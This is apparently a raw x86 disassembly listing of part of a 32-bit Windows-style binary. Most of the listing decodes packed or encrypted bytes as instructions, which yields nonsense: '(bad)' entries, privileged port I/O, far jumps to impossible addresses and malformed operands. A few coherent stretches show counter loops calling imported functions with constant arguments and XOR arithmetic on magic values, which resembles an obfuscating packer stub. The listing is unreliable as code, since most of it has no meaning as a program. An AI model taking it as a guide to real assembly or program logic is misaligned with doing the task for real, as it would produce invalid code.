  407293:	mov    WORD PTR [eax+eiz*1+0x68e2db5b],es
  40729a:	int    0x17
  40729c:	retf   0x295b
  40729f:	or     eax,0x6a705e7b
  4072a4:	xchg   ebx,eax
  4072a5:	dec    edx
  4072a6:	loope  0x4072e7
  4072a8:	repz in eax,0xa7
  4072ab:	mov    eax,DWORD PTR [ecx]
  4072ad:	es jge 0x4072a9
  4072b0:	xchg   edx,eax
  4072b1:	out    dx,eax
  4072b2:	in     eax,0xa6
  4072b4:	and    al,0x78
  4072b6:	repz xchg edx,eax
  4072b8:	xlat   BYTE PTR ds:[ebx]
  4072b9:	add    BYTE PTR [ebx],bl
  4072bb:	bound  edi,QWORD PTR [edx-0x6a]
  4072be:	mov    eax,0xe0558b32
  4072c3:	mov    ebx,DWORD PTR [ebp-0x8]
  4072c6:	xor    edx,eax
  4072c8:	add    edx,ecx
  4072ca:	imul   edx,ebx
  4072cd:	cmp    edx,edi
  4072cf:	jbe    0x40619a
  4072d5:	pop    ebx
  4072d6:	jmp    0x407428
  4072db:	push   ds
  4072dc:	cld    
  4072dd:	dec    edi
  4072de:	or     ebp,DWORD PTR [ebp-0x27]
  4072e1:	jp     0x40728c
  4072e3:	adc    edi,0xcf9f0f0c
  4072e9:	cli    
  4072ea:	(bad)  
  4072eb:	clc    
  4072ec:	sbb    BYTE PTR [esi+0x7e],bh
  4072ef:	and    edi,DWORD PTR [edi+0x7e]
  4072f2:	jle    0x40730e
  4072f4:	pop    esi
  4072f5:	xor    cl,dl
  4072f7:	es mov ebx,0x42031a89
  4072fd:	iret   
  4072fe:	adc    dh,BYTE PTR [ebp+0x14]
  407301:	dec    edx
  407302:	fs ret 0x7f5a
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	cmp    al,0xd8
  407309:	xor    DWORD PTR [ebx],0x77
  40730c:	ja     0x407305
  40730e:	das    
  40730f:	pop    esi
  407310:	jb     0x40738d
  407312:	ja     0x407384
  407314:	mov    dl,0xb5
  407316:	and    ebx,DWORD PTR [esi]
  407318:	pusha  
  407319:	in     al,dx
  40731a:	xchg   edi,eax
  40731b:	mov    esp,0x4266a07c
  407320:	pop    ds
  407321:	and    esp,esp
  407323:	mov    dh,0xd8
  407325:	inc    esp
  407326:	xchg   edi,eax
  407327:	adc    esp,edx
  407329:	mov    fs,WORD PTR [esi-0x8]
  40732c:	fcomp  QWORD PTR [esi+0x2e0327de]
  407332:	cwde   
  407333:	xor    DWORD PTR [ebx-0x2947f6fe],esp
  407339:	xchg   ecx,eax
  40733a:	outs   dx,BYTE PTR ds:[esi]
  40733b:	mov    eax,0x72b60fc3
  407340:	ja     0x4072f2
  407342:	mov    ebx,0x95ef3c0f
  407347:	es pushf 
  407349:	loopne 0x4072d2
  40734b:	cdq    
  40734c:	mov    ebp,0x4d38ba0
  407351:	xor    al,0xa3
  407353:	cs push cs
  407355:	cmp    DWORD PTR [ebx-0x753af46d],esi
  40735b:	jmp    0x11fcf109
  407360:	fcomp  QWORD PTR [ebx]
  407362:	lea    eax,[ebx]
  407364:	call   0x4057f3f2
  407369:	cdq    
  40736a:	in     eax,dx
  40736b:	test   BYTE PTR [esi-0x566d4730],cl
  407371:	push   ebp
  407372:	js     0x4073ab
  407374:	mov    ds:0x21fef78b,eax
  407379:	loop   0x4073f3
  40737b:	cdq    
  40737c:	xchg   edi,eax
  40737d:	lock shl BYTE PTR [esi+0x3b929795],cl
  407384:	cmp    eax,0x2280ad6f
  407389:	adc    bl,BYTE PTR [edi+0xe6f28ab]
  40738f:	les    edx,FWORD PTR [eax-0x59e5290e]
  407395:	loop   0x40733e
  407397:	sbb    DWORD PTR [edi],esi
  407399:	xlat   BYTE PTR ds:[ebx]
  40739a:	(bad)  
  40739b:	mov    ch,0x43
  40739d:	fld    TBYTE PTR [edi]
  40739f:	mov    al,ds:0x4e7e5119
  4073a4:	mov    esi,0x6afe5fb6
  4073a9:	int3   
  4073aa:	call   FWORD PTR [edx-0x65d13fd4]
  4073b0:	imul   ebx,DWORD PTR [esi-0x4],0x683901e6
  4073b7:	and    esi,eax
  4073b9:	je     0x407413
  4073bb:	sub    dh,BYTE PTR [eax-0x40]
  4073be:	xor    eax,0x904e242a
  4073c3:	repnz dec ebp
  4073c5:	xchg   esi,eax
  4073c6:	ror    DWORD PTR [esi+0xeac4037],0x6b
  4073cd:	pop    DWORD PTR [esi-0x775d0b31]
  4073d3:	pop    ds
  4073d4:	mov    BYTE PTR [eax-0x7e],ch
  4073d7:	das    
  4073d8:	pop    eax
  4073d9:	ss adc eax,0x5269b455
  4073df:	stos   DWORD PTR es:[edi],eax
  4073e0:	push   edx
  4073e1:	mov    ah,cl
  4073e3:	pop    ebx
  4073e4:	popa   
  4073e5:	sbb    DWORD PTR [esi],edi
  4073e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e8:	fneni(8087 only) 
  4073ea:	lods   eax,DWORD PTR ds:[esi]
  4073eb:	jns    0x407383
  4073ed:	lds    ebx,FWORD PTR [ebx]
  4073ef:	stc    
  4073f0:	mov    ecx,0x7f2bb31f
  4073f5:	pop    eax
  4073f6:	sbb    al,0x88
  4073f8:	sbb    DWORD PTR [ebx],esi
  4073fa:	enter  0xf57e,0xac
  4073fe:	mov    ds:0xd563df36,al
  407403:	cld    
  407404:	jge    0x407397
  407406:	push   0x9905d6d0
  40740b:	sti    
  40740c:	jge    0x407467
  40740e:	repz xor DWORD PTR [edx+0x48c27ed8],esp
  407415:	sub    DWORD PTR [ebx+0x39],eax
  407418:	ss dec edi
  40741a:	dec    esp
  40741b:	nop
  40741c:	into   
  40741d:	pop    ecx
  40741e:	sub    bh,BYTE PTR [ecx+0x18]
  407421:	jno    0x4073f5
  407423:	(bad)
  407426:	adc    BYTE PTR [ebp+0x8c2c95f],ah
  40742c:	add    BYTE PTR [ebp-0x75],dl
  40742f:	in     al,dx
  407430:	jmp    0x4075bc
  407435:	jb     0x407447
  407437:	test   eax,0x8a95a91d
  40743c:	adc    DWORD PTR [ebp+eax*1-0x49ced801],edi
  407443:	call   0x7e5a218f
  407448:	jle    0x407433
  40744a:	jg     0x4074ca
  40744c:	jle    0x407468
  40744e:	(bad)  
  40744f:	sub    al,0x72
  407451:	xchg   ebp,eax
  407452:	ret    
  407453:	xchg   esp,eax
  407454:	jo     0x407487
  407456:	adc    esi,edi
  407458:	out    dx,eax
  407459:	dec    esi
  40745a:	mov    DWORD PTR ds:0x3f821eb5,eax
  407461:	cli    
  407462:	or     esi,ebx
  407464:	sar    bh,cl
  407466:	pushf  
  407467:	inc    DWORD PTR [ebp-0x6f]
  40746a:	jbe    0x407437
  40746c:	mov    cl,0x31
  40746e:	xchg   ebx,eax
  40746f:	mov    al,ds:0xa5eedcf3
  407474:	shr    BYTE PTR [ecx+0x115f908b],cl
  40747a:	xor    BYTE PTR [edx],ah
  40747c:	aad    0x82
  40747e:	xor    BYTE PTR [ecx-0x36],al
  407481:	mov    BYTE PTR [esi+ebp*2],bl
  407484:	sar    BYTE PTR [edi+ebx*4-0x4a6f8ba],cl
  40748b:	ins    BYTE PTR es:[edi],dx
  40748c:	out    dx,al
  40748d:	xchg   esp,eax
  40748e:	stos   DWORD PTR es:[edi],eax
  40748f:	nop
  407490:	inc    ebx
  407491:	pop    edx
  407492:	std    
  407493:	imul   esp,DWORD PTR [esi],0xffffffa1
  407496:	push   ds
  407497:	push   ebx
  407498:	jge    0x407478
  40749a:	mov    dh,0xf5
  40749c:	jns    0x407458
  40749e:	sub    eax,0x65d79195
  4074a3:	fwait
  4074a4:	push   0x221bab1d
  4074a9:	cmp    edx,ebx
  4074ab:	sub    al,dl
  4074ad:	and    eax,0xecb08ab4
  4074b2:	ror    DWORD PTR [ebx+0x21],1
  4074b5:	jmp    0x37ea5c12
  4074ba:	cmp    DWORD PTR [edi],esi
  4074bc:	aaa    
  4074bd:	inc    ebx
  4074be:	dec    esp
  4074bf:	dec    esi
  4074c0:	xchg   ecx,eax
  4074c1:	imul   edx,ecx,0x42c1ce1f
  4074c7:	cwde   
  4074c8:	fcomp  DWORD PTR [edi-0x60c8ed29]
  4074ce:	mov    dl,0x3
  4074d0:	jmp    0x4074c1
  4074d2:	push   ebp
  4074d3:	or     al,0x77
  4074d5:	adc    BYTE PTR [edi+0x46],0xe3
  4074d9:	push   ebp
  4074da:	mov    ah,0xd
  4074dc:	(bad)  
  4074dd:	scas   eax,DWORD PTR es:[edi]
  4074de:	push   ds
  4074df:	pop    ss
  4074e0:	xor    bh,BYTE PTR [eax-0x4096d29c]
  4074e6:	xor    DWORD PTR [edx+0x2edff553],ecx
  4074ec:	jae    0x4074a5
  4074ee:	adc    eax,0xc0b2daa4
  4074f3:	(bad)  
  4074f4:	icebp  
  4074f5:	pop    ss
  4074f6:	rol    DWORD PTR ds:0xbc40e6ae,0xc6
  4074fd:	jb     0x407506
  4074ff:	ret    
  407500:	ret    
  407501:	xchg   ebp,eax
  407502:	pop    es
  407503:	scas   al,BYTE PTR es:[edi]
  407504:	or     ebx,DWORD PTR [ebx+0xa]
  407507:	pusha  
  407508:	rcl    bl,1
  40750a:	cmp    al,0x98
  40750c:	mov    DWORD PTR [ebx],ebx
  40750e:	xlat   BYTE PTR ds:[ebx]
  40750f:	leave  
  407510:	in     al,0xc9
  407512:	cmp    al,al
  407514:	cmp    DWORD PTR [edi],0x8b75ffe2
  40751a:	mov    al,ds:0xf6331a56
  40751f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407520:	iret   
  407521:	dec    ebx
  407522:	sbb    cl,cl
  407524:	pop    edi
  407525:	mov    al,ds:0x7bd3f52c
  40752a:	add    ecx,0x5f3f689c
  407530:	mov    ds:0x30f41d99,al
  407535:	adc    eax,DWORD PTR [esi-0x15969cca]
  40753b:	aam    0xbb
  40753d:	mov    dh,0xcd
  40753f:	inc    eax
  407540:	mov    BYTE PTR [ebx],bl
  407542:	pop    ebp
  407543:	xchg   esi,eax
  407544:	mov    edx,ecx
  407546:	outs   dx,DWORD PTR ds:[esi]
  407547:	popa   
  407548:	ss pop eax
  40754a:	xchg   esp,eax
  40754b:	out    0xb1,al
  40754d:	pop    ebp
  40754e:	push   ebx
  40754f:	sbb    ebp,DWORD PTR [ebx]
  407551:	hlt    
  407552:	mov    edx,0x578cec3
  407557:	imul   ebp,DWORD PTR [ecx],0x6dd807f2
  40755d:	addr16 pusha 
  40755f:	xchg   edi,eax
  407560:	sbb    cl,dl
  407562:	jno    0x4075dc
  407564:	xchg   esi,eax
  407565:	xor    ch,BYTE PTR [eax]
  407567:	xchg   bl,al
  407569:	(bad)  
  40756a:	fnstenv [ebp+0x64]
  40756d:	aad    0x6d
  40756f:	loop   0x4075c4
  407571:	cmp    al,al
  407573:	sbb    ecx,DWORD PTR ds:0xf675539e
  407579:	or     eax,0xddd353a4
  40757e:	sar    DWORD PTR [ecx+0x3],cl
  407581:	shl    DWORD PTR [eax+0x4b],1
  407584:	adc    eax,0xe549c84e
  407589:	rcr    DWORD PTR [esi+0x53],1
  40758c:	adc    BYTE PTR [ebx],0xac
  40758f:	ret    0xdc6e
  407592:	fsub   DWORD PTR [eax]
  407594:	cmp    BYTE PTR [ecx+0x26f0b0d5],0xf5
  40759b:	adc    BYTE PTR [edx*2+0x79d190f6],bl
  4075a2:	adc    BYTE PTR [edi],bl
  4075a4:	sbb    eax,0x43e30a8a
  4075a9:	sub    BYTE PTR [ebx+0xa],0xa8
  4075ad:	adc    al,0xc3
  4075af:	adc    al,0x11
  4075b1:	mov    esp,0x691d6d46
  4075b6:	test   eax,0x13e81291
  4075bb:	xor    edx,DWORD PTR [ecx+0x51]
  4075be:	and    DWORD PTR ds:0x41abce,0x0
  4075c8:	jmp    0x4075da
  4075cd:	mov    edx,DWORD PTR ds:0x41abce
  4075d3:	inc    edx
  4075d4:	mov    DWORD PTR ds:0x41abce,edx
  4075da:	cmp    DWORD PTR ds:0x41abce,0x1e
  4075e1:	jae    0x407619
  4075e7:	cmp    DWORD PTR ds:0x41abce,0x20
  4075ee:	jne    0x40760a
  4075f4:	push   DWORD PTR [ebp-0x28]
  4075f7:	push   0x365e
  4075fc:	push   DWORD PTR [ebp-0x18]
  4075ff:	push   0x4c62
  407604:	call   DWORD PTR ds:0x40d004
  40760a:	jmp    0x4075cd
  40760f:	xor    DWORD PTR ds:0x412374,0x3a52
  407619:	mov    eax,0xf89c8538
  40761e:	sub    ecx,ecx
  407620:	mov    DWORD PTR [ebp-0x8],eax
  407623:	and    DWORD PTR ds:0x41abd6,0x0
  40762d:	jmp    0x40763f
  407632:	mov    ecx,DWORD PTR ds:0x41abd6
  407638:	inc    ecx
  407639:	mov    DWORD PTR ds:0x41abd6,ecx
  40763f:	cmp    DWORD PTR ds:0x41abd6,0x1e
  407646:	jae    0x4076c6
  40764c:	cmp    DWORD PTR ds:0x41abd6,0x2d
  407653:	jne    0x40765f
  407659:	call   DWORD PTR ds:0x40d1d8
  40765f:	jmp    0x407632
  407664:	and    DWORD PTR ds:0x417e45,0x0
  40766e:	jmp    0x407680
  407673:	mov    edx,DWORD PTR ds:0x417e45
  407679:	inc    edx
  40767a:	mov    DWORD PTR ds:0x417e45,edx
  407680:	cmp    DWORD PTR ds:0x417e45,0x1b
  407687:	jae    0x4076c6
  40768d:	cmp    DWORD PTR ds:0x417e45,0x8
  407694:	jne    0x4076a5
  40769a:	push   0x41abea
  40769f:	call   DWORD PTR ds:0x40d1dc
  4076a5:	cmp    DWORD PTR ds:0x417e45,0x7
  4076ac:	jne    0x4076c1
  4076b2:	xor    edx,edx
  4076b4:	add    edx,DWORD PTR ds:0x417e45
  4076ba:	inc    edx
  4076bb:	mov    DWORD PTR ds:0x417e45,edx
  4076c1:	jmp    0x407673
  4076c6:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  4076cd:	mov    edx,DWORD PTR [ebp-0x8]
  4076d0:	push   esi
  4076d1:	adc    esi,ecx
  4076d3:	mov    ecx,0x7510859
  4076d8:	xor    edx,ecx
  4076da:	mov    esi,0x32729f
  4076df:	push   edi
  4076e0:	mov    edi,DWORD PTR [ebp+0x10]
  4076e3:	add    edx,esi
  4076e5:	cmp    edi,edx
  4076e7:	jmp    0x407873
  4076ec:	iret   
  4076ed:	in     eax,0x74
  4076ef:	push   edx
  4076f0:	adc    al,0x63
  4076f2:	jns    0x40776d
  4076f4:	int    0x3e
  4076f6:	les    ebp,FWORD PTR [esi-0x78]
  4076f9:	xlat   BYTE PTR ds:[ebx]
  4076fa:	mov    al,ds:0x7e1f1c4d
  4076ff:	jle    0x4076ea
  407701:	jg     0x407781
  407703:	jle    0x40771c
  407705:	mov    ebp,0xb67e2785
  40770a:	js     0x407758
  40770c:	fidivr DWORD PTR [edi]
  40770e:	xchg   dh,bh
  407710:	lahf   
  407711:	and    BYTE PTR [ebp+eax*1+0x8],ah
  407715:	sub    eax,0x7ddaa673
  40771a:	xor    esi,DWORD PTR [edx-0x13f3c56f]
  407720:	call   DWORD PTR [eax+0x57]
  407723:	mov    cl,0x4c
  407725:	pop    es
  407726:	push   esp
  407727:	push   esi
  407728:	push   ss
  407729:	mov    dh,0x8f
  40772b:	stc    
  40772c:	dec    ebx
  40772d:	cld    
  40772e:	xor    eax,0xf4764541
  407733:	inc    esi
  407734:	retf   0x9498
  407737:	inc    esi
  407738:	es push ds
  40773a:	loop   0x40775f
  40773c:	pop    edi
  40773d:	mov    bh,0x4a
  40773f:	loop   0x407723
  407741:	xchg   ebp,eax
  407742:	push   edx
  407743:	or     BYTE PTR [esi+0x193bd1df],bl
  407749:	mov    ebx,0x6ec01ff7
  40774e:	push   es
  40774f:	mov    ah,0xc6
  407751:	push   0x45
  407753:	mov    ds:0xd0e4c99a,eax
  407758:	sub    al,0xba
  40775a:	mov    bh,0x1f
  40775c:	push   ax
  40775e:	inc    ebx
  40775f:	pop    esi
  407760:	or     DWORD PTR [edx],edx
  407762:	push   ds
  407763:	repnz pushf 
  407765:	pop    edx
  407766:	jecxz  0x407772
  407768:	test   DWORD PTR [eax],ebx
  40776a:	data16 sub bh,bh
  40776d:	lea    ebp,ds:0xc33549d2
  407773:	cmp    eax,0x62618720
  407778:	aad    0x64
  40777a:	jne    0x407770
  40777c:	je     0x4077fb
  40777e:	add    eax,0xb04a2baf
  407783:	cmp    al,0xa9
  407785:	imul   ecx,DWORD PTR [eax+edx*4+0x435c14a9],0xd48f09cf
  407790:	retf   0xbc39
  407793:	(bad)  
  407794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407795:	iret   
  407796:	cs in  eax,0xfb
  407799:	sbb    ch,BYTE PTR [esi+0x34]
  40779c:	sbb    DWORD PTR [ecx+0x57],ebx
  40779f:	dec    edi
  4077a0:	mov    dl,0x36
  4077a2:	xchg   DWORD PTR [ebp+0x14],esi
  4077a5:	(bad)  
  4077a6:	gs cmc 
  4077a8:	mov    ds,WORD PTR [ebx]
  4077aa:	lock pop ss
  4077ac:	fs dec ebp
  4077ae:	push   edx
  4077af:	shl    BYTE PTR [ebx-0x71],1
  4077b2:	in     al,dx
  4077b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077b4:	(bad)  
  4077b5:	int    0xc5
  4077b7:	or     ah,bl
  4077b9:	fnstenv [esp+ebp*1]
  4077bc:	es pop eax
  4077be:	pop    edx
  4077bf:	xor    al,BYTE PTR [eax-0x45]
  4077c2:	mov    ds:0xf0a624c,al
  4077c7:	fdiv   DWORD PTR [esi]
  4077c9:	in     ax,0x8f
  4077cc:	aaa    
  4077cd:	cmp    eax,0xcec14acc
  4077d2:	jbe    0x4077fd
  4077d4:	push   cs
  4077d5:	lods   al,BYTE PTR ds:[esi]
  4077d6:	ror    BYTE PTR [ecx-0x38a646af],1
  4077dc:	pop    edx
  4077dd:	ret    0x71a4
  4077e0:	mov    fs,WORD PTR [edi-0x4f]
  4077e3:	dec    edi
  4077e4:	adc    BYTE PTR [ecx],0x1
  4077e7:	arpl   di,di
  4077e9:	push   ecx
  4077ea:	retf   0x8daa
  4077ed:	inc    ecx
  4077ee:	sbb    cl,0x5b
  4077f1:	repnz mov eax,ds:0x586fd30
  4077f7:	lock int 0x84
  4077fa:	mov    ds:0x8ad76f7a,al
  4077ff:	js     0x407874
  407801:	icebp  
  407802:	and    eax,0x6a93f329
  407807:	dec    esp
  407808:	or     bl,BYTE PTR [ebp-0x832f840]
  40780e:	(bad)  
  40780f:	std    
  407810:	mov    dl,BYTE PTR [ecx+eiz*2+0x16f9847]
  407817:	sahf   
  407818:	pop    esi
  407819:	jnp    0x4077ae
  40781b:	outs   dx,DWORD PTR ds:[esi]
  40781c:	daa    
  40781d:	push   0x42d97e2a
  407822:	(bad)  
  407823:	cs xchg edi,eax
  407825:	inc    edi
  407826:	ret    
  407827:	add    al,0x7b
  407829:	ret    
  40782a:	retf   
  40782b:	sub    ch,BYTE PTR [edi]
  40782d:	ins    DWORD PTR es:[edi],dx
  40782e:	enter  0xf9db,0xf0
  407832:	sti    
  407833:	xchg   ebx,eax
  407834:	pop    esp
  407835:	add    edx,edx
  407837:	cs inc ecx
  407839:	repz sti 
  40783b:	ins    DWORD PTR es:[edi],dx
  40783c:	mov    bh,0x56
  40783e:	cmp    ebx,DWORD PTR [ebx]
  407840:	xor    al,cl
  407842:	pop    ds
  407843:	jge    0x407817
  407845:	outs   dx,DWORD PTR ds:[esi]
  407846:	outs   dx,BYTE PTR ds:[esi]
  407847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407848:	adc    BYTE PTR [ecx],0x83
  40784b:	(bad)  
  40784c:	aam    0x27
  40784e:	mov    dh,0xa6
  407850:	call   0x6f4a:0xc7f3019c
  407857:	call   0xf6cfe1e1
  40785c:	mov    edi,0x120d76c3
  407861:	repz jo 0x40786c
  407864:	push   ss
  407865:	fild   WORD PTR [edx-0x25]
  407868:	push   es
  407869:	(bad)  
  40786a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40786b:	pop    eax
  40786c:	bound  ecx,QWORD PTR [ebx]
  40786e:	sbb    bh,BYTE PTR [ecx]
  407870:	in     eax,dx
  407871:	adc    DWORD PTR fs:[edi],ecx
  407874:	test   BYTE PTR [ebx-0x16fffffd],cl
  40787a:	xchg   DWORD PTR [ecx],eax
  40787c:	add    BYTE PTR [eax],al
  40787e:	in     eax,dx
  40787f:	(bad)  
  407880:	pop    esi
  407881:	jg     0x4078d7
  407883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407884:	ins    DWORD PTR es:[edi],dx
  407885:	in     eax,0x5e
  407887:	imul   eax,DWORD PTR [esi+0x4b717d8c],0xffffffed
  40788e:	(bad)  
  40788f:	sbb    al,0x7e
  407891:	jle    0x40787c
  407893:	jg     0x407913
  407895:	jle    0x40788e
  407897:	imul   edx,ebx,0x8119bef7
  40789d:	add    ah,BYTE PTR [eax-0x6e]
  4078a0:	or     al,0x7d
  4078a2:	lods   eax,DWORD PTR ds:[esi]
  4078a3:	push   eax
  4078a4:	pop    esp
  4078a5:	sbb    bl,ah
  4078a7:	xor    eax,0xc32873fc
  4078ac:	cmp    al,al
  4078ae:	mov    BYTE PTR [edx-0x25],0x87
  4078b2:	shl    edi,1
  4078b4:	pop    esp
  4078b5:	retf   
  4078b6:	pop    ebp
  4078b7:	imul   esi,DWORD PTR [ebx-0x1c446a76],0x760a51ff
  4078c1:	jmp    0x34bf:0xd605db47
  4078c8:	fst    DWORD PTR [ebp-0x71]
  4078cb:	and    eax,0x246df008
  4078d0:	lods   al,BYTE PTR ds:[esi]
  4078d1:	in     al,dx
  4078d2:	in     eax,0x49
  4078d4:	rcr    BYTE PTR [esi+0xf],0xde
  4078d8:	sbb    al,0xcf
  4078da:	test   al,0x99
  4078dc:	adc    DWORD PTR [eax+0x5a5f9fe9],edx
  4078e2:	and    cl,BYTE PTR [esi+0x48379719]
  4078e8:	xchg   BYTE PTR [ebx+edi*4],ch
  4078eb:	shr    BYTE PTR [eax+0x5b01acb1],cl
  4078f1:	jmp    0x96af:0xcc82fc3b
  4078f8:	jg     0x4078c1
  4078fa:	pop    ebp
  4078fb:	dec    ebx
  4078fc:	sub    ebp,0xffffffb4
  4078ff:	adc    eax,0x9e653171
  407904:	jl     0x407980
  407906:	aaa    
  407907:	sub    BYTE PTR [edi+edx*8+0x46fbe104],bl
  40790e:	and    DWORD PTR [edx+ebp*8],eax
  407911:	jbe    0x407973
  407913:	pop    ebx
  407914:	xor    BYTE PTR fs:[ecx+0x3d],0xfb
  407919:	and    dh,dl
  40791b:	mov    al,ds:0x4005a06
  407920:	inc    eax
  407921:	add    eax,0x91609a56
  407926:	mov    al,0x86
  407928:	adc    BYTE PTR [edi+0x7a5fc318],ch
  40792e:	(bad)  
  407931:	dec    esi
  407932:	mov    ds:0x1ab84c8e,al
  407937:	jmp    0x5d1cbc11
  40793c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40793d:	inc    edx
  40793e:	xor    esi,ebp
  407940:	popf   
  407941:	cdq    
  407942:	shr    BYTE PTR [ebx],1
  407944:	push   esi
  407945:	jmp    0x4078de
  407947:	push   ecx
  407948:	sub    al,0x37
  40794a:	into   
  40794b:	gs imul ecx,DWORD PTR ds:[esi],0x4d
  407950:	cmp    edx,DWORD PTR [ecx]
  407952:	imul   ebx,edi,0x49
  407955:	daa    
  407956:	sub    bl,BYTE PTR [esi]
  407958:	lods   eax,DWORD PTR ds:[esi]
  407959:	(bad)  
  40795a:	mov    ?,eax
  40795c:	mov    BYTE PTR [eax+ecx*1],0xec
  407960:	pop    eax
  407961:	push   es
  407962:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407963:	rcr    DWORD PTR [ebp+eax*1-0x5f87640e],cl
  40796a:	pop    esi
  40796b:	push   ds
  40796c:	test   cl,dl
  40796e:	cmp    bh,BYTE PTR [eax]
  407970:	int3   
  407971:	and    bl,BYTE PTR [edx-0x55]
  407974:	add    al,0xed
  407976:	cmp    bh,BYTE PTR [ebp+0x4c4ac11d]
  40797c:	jno    0x4079e2
  40797e:	icebp  
  40797f:	mov    ebx,0x549a278d
  407984:	mov    dh,0xdc
  407986:	jp     0x40796d
  407988:	xor    edi,edi
  40798a:	sub    al,0xa8
  40798c:	and    al,0xf7
  40798e:	inc    ebx
  40798f:	call   0xca3a:0x2870e5b8
  407996:	or     al,0xbe
  407998:	sti    
  407999:	xchg   ebx,eax
  40799a:	retf   
  40799b:	ficomp WORD PTR [ebx-0x668c72d3]
  4079a1:	mov    ds:0x49d2738a,eax
  4079a6:	mov    cl,0xdd
  4079a8:	call   DWORD PTR [ebx]
  4079aa:	mov    ecx,0xbe32267d
  4079af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b0:	hlt    
  4079b1:	inc    ecx
  4079b2:	data16 fild QWORD PTR [edi]
  4079b5:	jp     0x407a08
  4079b7:	je     0x407949
  4079b9:	jns    0x40797e
  4079bb:	mov    ebx,0x9832342c
  4079c0:	pop    ecx
  4079c1:	sbb    eax,0xd7930bb4
  4079c6:	retf   
  4079c7:	xchg   ch,al
  4079c9:	enter  0x9396,0x5a
  4079cd:	jbe    0x4079b3
  4079cf:	add    eax,0xde6bcccf
  4079d4:	lods   eax,DWORD PTR ds:[esi]
  4079d5:	pop    ss
  4079d6:	mov    esi,0x3843ad72
  4079db:	ficom  DWORD PTR [eax+ebp*2+0x974bcdd]
  4079e2:	jne    0x407a2e
  4079e4:	repz or DWORD PTR [ebx],ebp
  4079e7:	mov    ds:0x73862fca,eax
  4079ec:	pushf  
  4079ed:	pop    ebp
  4079ee:	ins    DWORD PTR es:[edi],dx
  4079ef:	dec    edi
  4079f0:	xchg   ebp,eax
  4079f1:	jmp    0x407a1b
  4079f3:	adc    DWORD PTR [ebp-0x6e7dd293],0x9eff8d01
  4079fd:	mov    ebx,0xc62fa61f
  407a02:	test   DWORD PTR [ebx+0x15],esi
  407a05:	mov    edx,DWORD PTR [ebp-0x8]
  407a08:	mov    eax,DWORD PTR [ebp-0x4]
  407a0b:	xor    eax,ecx
  407a0d:	mov    edi,0xffcd8d61
  407a12:	sub    edi,eax
  407a14:	jmp    0x407ba0
  407a19:	les    edi,FWORD PTR [eax]
  407a1b:	add    ch,BYTE PTR [edi-0x1e]
  407a1e:	gs jns 0x4079da
  407a21:	dec    esp
  407a22:	hlt    
  407a23:	sbb    BYTE PTR [ecx+0x48],0xc2
  407a27:	cmc    
  407a28:	sar    BYTE PTR [esi+0x12],cl
  407a2b:	jle    0x407aab
  407a2d:	jmp    0x87bef8b1
  407a32:	std    
  407a33:	jne    0x4079e7
  407a35:	fwait
  407a36:	dec    edi
  407a37:	ds jns 0x407aa1
  407a3a:	pop    esi
  407a3b:	mov    dh,0x70
  407a3d:	lds    edi,FWORD PTR [edi-0x2e]
  407a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a41:	ds xchg ebx,eax
  407a43:	call   0x6f60e8d0
  407a48:	fwait
  407a49:	scas   eax,DWORD PTR es:[edi]
  407a4a:	dec    esi
  407a4b:	xchg   DWORD PTR [ecx],edx
  407a4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a4e:	pop    ds
  407a4f:	jns    0x4079f6
  407a51:	pop    ss
  407a52:	in     eax,dx
  407a53:	loop   0x4079d6
  407a55:	push   esi
  407a56:	daa    
  407a57:	daa    
  407a58:	fwait
  407a59:	iret   
  407a5a:	push   cs
  407a5b:	fwait
  407a5c:	aas    
  407a5d:	imul   DWORD PTR [edi]
  407a5f:	mov    BYTE PTR [esi+0x3f],0xbb
  407a63:	lods   eax,DWORD PTR ds:[esi]
  407a64:	add    ebx,DWORD PTR [esi+0x189429f5]
  407a6a:	ja     0x4079f7
  407a6c:	enter  0xf89c,0x57
  407a70:	mov    ah,0x6e
  407a72:	aas    
  407a73:	dec    ebp
  407a74:	xor    esp,DWORD PTR [ebx+0x3c]
  407a77:	ins    DWORD PTR es:[edi],dx
  407a78:	add    bh,BYTE PTR [ebp-0x44]
  407a7b:	loope  0x407a54
  407a7d:	jb     0x407ae6
  407a7f:	inc    ebx
  407a80:	xchg   ebp,eax
  407a81:	pop    ebx
  407a82:	dec    eax
  407a83:	adc    eax,0x7d610def
  407a88:	mov    esp,0x102e1566
  407a8d:	jg     0x407a26
  407a8f:	jmp    0x9c61:0xd4cdba8c
  407a96:	shl    DWORD PTR [esi+0x7e9ee558],0x1d
  407a9d:	lock mov al,0x1c
  407aa0:	out    dx,eax
  407aa1:	pop    ebp
  407aa2:	je     0x407ad6
  407aa4:	lds    ebx,FWORD PTR ds:0xd0294d90
  407aaa:	or     DWORD PTR [esi-0x2e53f6ef],esp
  407ab0:	stos   BYTE PTR es:[edi],al
  407ab1:	scas   al,BYTE PTR es:[edi]
  407ab2:	aaa    
  407ab3:	fistp  QWORD PTR [ebx]
  407ab5:	dec    ebp
  407ab6:	call   0xcf56c1da
  407abb:	cld    
  407abc:	fistp  WORD PTR [ecx]
  407abe:	lea    ecx,[bx]
  407ac1:	mov    esp,0x280181d7
  407ac6:	mov    ecx,0x9ad4f2fe
  407acb:	iret   
  407acc:	or     edi,0x33338475
  407ad2:	pop    esp
  407ad3:	push   0x3a31083c
  407ad8:	inc    esp
  407ad9:	mul    DWORD PTR [eax+eiz*1-0x2f]
  407add:	add    esi,esp
  407adf:	sbb    BYTE PTR [ecx],dl
  407ae1:	enter  0xf1c6,0x15
  407ae5:	add    bh,bl
  407ae7:	inc    eax
  407ae8:	xor    DWORD PTR [ecx+0x62],eax
  407aeb:	push   0x46aef29a
  407af0:	sub    eax,0x53d4e944
  407af5:	mov    esp,0x1054f7f
  407afa:	scas   eax,DWORD PTR es:[edi]
